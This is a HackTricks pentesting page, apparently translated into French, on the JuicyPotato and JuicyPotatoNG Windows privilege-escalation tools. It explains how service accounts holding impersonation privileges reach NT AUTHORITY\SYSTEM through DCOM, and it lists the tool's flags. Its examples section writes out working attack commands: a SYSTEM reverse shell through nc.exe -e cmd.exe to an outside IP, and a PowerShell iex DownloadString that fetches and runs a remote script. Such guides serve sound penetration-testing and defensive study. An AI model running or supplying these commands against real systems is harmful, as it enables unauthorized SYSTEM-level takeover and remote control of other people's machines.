# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato est obsolète. Il fonctionne généralement sur les versions de Windows jusqu'à Windows 10 1803 / Windows Server 2016. Les changements apportés par Microsoft à partir de Windows 10 1809 / Server 2019 ont cassé la technique originale. Pour ces builds et les versions plus récentes, envisagez des alternatives modernes telles que PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato et autres. Voir la page ci‑dessous pour des options et usages à jour.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abus des privilèges 'golden') <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Une version sucrée de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, avec un peu de jus, c.-à-d. **un autre outil de Local Privilege Escalation, de Windows Service Accounts vers NT AUTHORITY\SYSTEM**_

#### Vous pouvez télécharger juicypotato depuis [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Notes rapides de compatibilité

- Fonctionne de façon fiable jusqu'à Windows 10 1803 et Windows Server 2016 lorsque le contexte courant dispose de SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege.
- Cassé par le durcissement Microsoft dans Windows 10 1809 / Windows Server 2019 et suivants. Préférez les alternatives listées ci‑dessus pour ces builds.

### Résumé <a href="#summary" id="summary"></a>

[**Extrait du Readme de juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) et ses [variants](https://github.com/decoder-it/lonelypotato) exploitent la chaîne d'escalade de privilèges basée sur le service [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) ayant le listener MiTM sur `127.0.0.1:6666` et lorsque vous disposez des privilèges `SeImpersonate` ou `SeAssignPrimaryToken`. Lors d'une revue de build Windows nous avons trouvé une configuration où `BITS` était intentionnellement désactivé et le port `6666` occupé.

Nous avons décidé d'exploiter [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) : **Voici Juicy Potato**.

> Pour la théorie, voir [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) et suivez la chaîne de liens et références.

Nous avons découvert que, en dehors de `BITS`, il existe plusieurs serveurs COM que nous pouvons abuser. Ils doivent simplement :

1. être instanciables par l'utilisateur courant, normalement un “service user” qui a des privilèges d'impersonation
2. implémenter l'interface `IMarshal`
3. s'exécuter en tant qu'utilisateur élevé (SYSTEM, Administrator, …)

Après quelques tests, nous avons obtenu et vérifié une liste exhaustive de [CLSID intéressants](http://ohpe.it/juicy-potato/CLSID/) sur plusieurs versions de Windows.

### Détails juteux <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato vous permet de :

- **Target CLSID** _choisissez n'importe quel CLSID que vous voulez._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _vous pouvez trouver la liste organisée par OS._
- **COM Listening port** _définissez le port d'écoute COM que vous préférez (au lieu du 6666 codé en dur dans le marshalling)_
- **COM Listening IP address** _lier le serveur sur n'importe quelle IP_
- **Process creation mode** _en fonction des privilèges de l'utilisateur impersonné vous pouvez choisir parmi :_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _lancez un exécutable ou un script si l'exploitation réussit_
- **Process Argument** _personnalisez les arguments du processus lancé_
- **RPC Server address** _pour une approche discrète vous pouvez vous authentifier auprès d'un serveur RPC externe_
- **RPC Server port** _utile si vous souhaitez vous authentifier auprès d'un serveur externe et que le pare‑feu bloque le port `135`…_
- **TEST mode** _principalement pour des tests, i.e. tester des CLSIDs. Il crée le DCOM et affiche l'utilisateur du token. Voir_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Utilisation <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Si l'utilisateur possède les privilèges `SeImpersonate` ou `SeAssignPrimaryToken`, alors vous êtes **SYSTEM**.

Il est presque impossible d'empêcher l'abus de tous ces COM Servers. Vous pourriez envisager de modifier les permissions de ces objets via `DCOMCNFG`, mais bonne chance, ce sera difficile.

La vraie solution est de protéger les comptes sensibles et les applications qui s'exécutent sous les comptes `* SERVICE`. Bloquer `DCOM` inhiberait certainement cet exploit mais pourrait avoir un impact sérieux sur le système d'exploitation sous-jacent.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG réintroduit un local privilege escalation de type JuicyPotato sur les Windows modernes en combinant :
- la résolution DCOM OXID vers un serveur RPC local sur un port choisi, évitant l'ancien listener codé en dur 127.0.0.1:6666.
- un hook SSPI pour capturer et usurper l'authentification SYSTEM entrante sans nécessiter RpcImpersonateClient, ce qui permet également CreateProcessAsUser lorsque seul SeAssignPrimaryTokenPrivilege est présent.
- des astuces pour satisfaire les contraintes d'activation DCOM (par ex., l'ancienne exigence de groupe INTERACTIVE lors du ciblage des classes PrintNotify / ActiveX Installer Service).

Remarques importantes (comportement évolutif selon les builds) :
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Si vous ciblez Windows 10 1809 / Server 2019 où la version classique de JuicyPotato est patchée, privilégiez les alternatives indiquées en haut (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG peut être situationnel selon le build et l'état des services.

## Exemples

Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.

### Obtenir un reverse shell avec nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Lancer un nouveau CMD (si vous avez accès RDP)

![](<../../images/image (300).png>)

## Problèmes de CLSID

Souvent, le CLSID par défaut utilisé par JuicyPotato **ne fonctionne pas** et l'exploit échoue. En général, il faut plusieurs tentatives pour trouver un **CLSID fonctionnel**. Pour obtenir une liste de CLSIDs à tester pour un système d'exploitation spécifique, vous devriez visiter cette page :

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Vérifier les CLSIDs**

D'abord, vous aurez besoin de quelques exécutables en plus de juicypotato.exe.

Téléchargez [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) et chargez-le dans votre session PS, puis téléchargez et exécutez [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ce script créera une liste de CLSIDs possibles à tester.

Ensuite, téléchargez [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(changez le chemin vers la liste de CLSID et vers l'exécutable juicypotato) et exécutez-le. Il commencera à essayer chaque CLSID, et **lorsque le numéro de port change, cela signifie que le CLSID a fonctionné**.

**Vérifiez** les CLSIDs fonctionnels **en utilisant le paramètre -c**

## Références

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
